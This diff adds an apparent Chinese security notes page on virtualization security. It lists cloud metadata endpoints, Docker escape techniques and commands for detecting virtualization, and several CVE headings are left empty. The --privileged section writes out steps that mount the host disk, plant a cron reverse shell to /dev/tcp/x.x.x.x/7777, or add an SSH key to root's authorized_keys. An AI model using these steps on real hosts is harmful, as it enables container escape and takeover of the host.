@@ -1,0 +1,145 @@
+I"><h1 id="探测">探测</h1>
+
+<p>适用于容器的技术：</p>
+
+<ul>
+  <li>systemd-detect-virt</li>
+</ul>
+
+<h2 id="一云环境元数据接口">一、云环境元数据接口</h2>
+
+<p>云环境存在实例metadata api，用以在实例内查询实例相关信息。可以利用metadata api 识别云环境类别。</p>
+
+<h3 id="腾讯云">腾讯云</h3>
+
+<p><a href="https://cloud.tencent.com/document/product/213/4934?from=10680">相关文档</a></p>
+
+<p>api地址:<code class="language-plaintext highlighter-rouge">http://metadata.tencentyun.com/latest/meta-data/</code></p>
+
+<p><img src="/img/2020-10-14-虚拟化安全/image-20201215151637788.png" alt="image-20201215151637788" /></p>
+
+<h3 id="阿里云">阿里云</h3>
+
+<p><a href="https://help.aliyun.com/document_detail/108460.html">相关文档</a></p>
+
+<p>api地址: <code class="language-plaintext highlighter-rouge">http://100.100.100.200/latest/meta-data/</code></p>
+
+<p><img src="/img/2020-10-14-虚拟化安全/image-20201215152213126.png" alt="image-20201215152213126" /></p>
+
+<h3 id="microsoft-azure">Microsoft Azure</h3>
+
+<p><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service">相关文档</a></p>
+
+<p>api地址: <code class="language-plaintext highlighter-rouge">http://169.254.169.254/metadata/instance</code></p>
+
+<h2 id="二docker逃逸">二、docker逃逸</h2>
+
+<h3 id="启动参数">启动参数</h3>
+
+<p><code class="language-plaintext highlighter-rouge">--privileged</code>利用</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>查看磁盘文件: fdisk -l
+新建目录: mkdir /master
+宿主机目录挂载至容器: mount /dev/sda1 /master
+使用计划任务反弹shell: echo '*****bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1'&gt;&gt; /master/var/spool/cron/root
+或写入ssh密钥文件：(echo -e "\n\n";cat id_rsa_new.pub) &gt;&gt; /master/root/.ssh/authorized_keys
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">--cap-add=SYS_ADMIN</code>利用</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>在容器内root权限
+容器必须使用SYS_ADMIN Linux capability运行
+容器必须缺少AppArmor配置文件，否则将允许mount syscall
+cgroup v1虚拟文件系统必须以读写方式安装在容器内部
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>其他参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>--net=host 启动时,绕过Network Namespace
+--pid=host 启动时,绕过PID Namespace
+--ipc=host 启动时,绕过IPC Namespace
+--volume /:/host 挂载主机目录到container
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="dockersock暴露">docker.sock暴露</h3>
+
+<h3 id="cve-2020-15257">CVE-2020-15257</h3>
+
+<p>需要设置：<code class="language-plaintext highlighter-rouge">--net=host</code></p>
+
+<h3 id="cve-2019-5736">cve-2019-5736</h3>
+
+<h3 id="cve-2019-14271">CVE-2019-14271</h3>
+
+<h3 id="cve-2019-13139">CVE-2019-13139</h3>
+
+<h3 id="dirty-cow">Dirty cow</h3>
+
+<h2 id="十一检测虚拟化环境类型">十一、检测虚拟化环境类型</h2>
+
+<h3 id="systemd-detect-virt">systemd-detect-virt</h3>
+
+<p>对于使用 systemd 的 Linux 系统，可以使用 systemd-detect-virt 命令来进行检测，该命令目前可以同时检测到基于 hypervisor 的虚拟化技术（例如 KVM、QEMU、VMware、Xen、Oracle VM、VirtualBox、UML）和基于容器的虚拟化技术（例如 LXC、Docker、OpenVZ）。</p>
+
+<h4 id="云环境">云环境</h4>
+
+<p><img src="/img/2020-10-14-虚拟化安全/image-20201014110730787.png" alt="image-20201014110730787" /></p>
+
+<h4 id="物理服务器">物理服务器</h4>
+
+<p>输出none</p>
+
+<h3 id="virt-what">virt-what</h3>
+
+<p>Linux 所使用虚拟化类型的方法是 virt-what 命令，virt-what 实际上是一个 Shell 脚本。它通过各种启发式方法来识别虚拟化环境类型，可以检测出 QEMU/KVM、VMware、Hyper-V、VirtualBox、OpenVZ/Virtuozzo、Xen、LXC、IBM PowerVM 以及 Parallels 等平台类型。</p>
+
+<p>在使用之前，大家需要先通过 apt-get 或 yum 安装 virt-what。</p>
+
+<h3 id="sudo-dmidecode--s-system-manufacturer">sudo dmidecode -s system-manufacturer</h3>
+
+<p>检测 Linux 底层的虚拟化类型首选的就是 dmidecode 命令，它最初设计来显示系统 BIOS 和硬件组件的相关信息。使用如下命令便可以检测相关虚拟化信息，如果你的系统运行在物理服务器上，输入的将是硬件制造商的实际名称（如 Dell Inc.）。如果你的 Linux  是运行在虚拟化平台中，则会显示所使用的虚拟化技术相关名称，如 「Microsoft  Corporation」「QEMU」「Xen」「VirtualBox」「VMware, Inc」等等。</p>
+
+<blockquote>
+  <p>该方法不适用于基于容器的虚拟化技术</p>
+</blockquote>
+
+<h3 id="sudo-readlink-proc1exe">sudo readlink /proc/1/exe</h3>
+
+<h3 id="ls-dockerenv">ls /.dockerenv</h3>
+
+<h3 id="grep-docker-proc1cgroup">grep ‘/docker’ /proc/1/cgroup</h3>
+
+<h3 id="ps--p1">ps -p1</h3>
+
+<h3 id="ps-aux">ps aux</h3>
+
+<h1 id="参考">参考</h1>
+
+<p><a href="https://www.sysgeek.cn/detect-virtualization-command-line/">检测Linux虚拟化平台类型的几种方式 - 系统极客</a></p>
+
+<p><a href="https://xz.aliyun.com/t/7881">Docker逃逸小结-先知社区</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>[美创安全实验室</td>
+      <td>docker逃逸原理](https://blog.csdn.net/meichuangkeji/article/details/107770194)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><a href="https://www.cdxy.me/?p=837">容器逃逸之CVE-2020-15257 containerd-shim Exploit开发</a></p>
+:ET
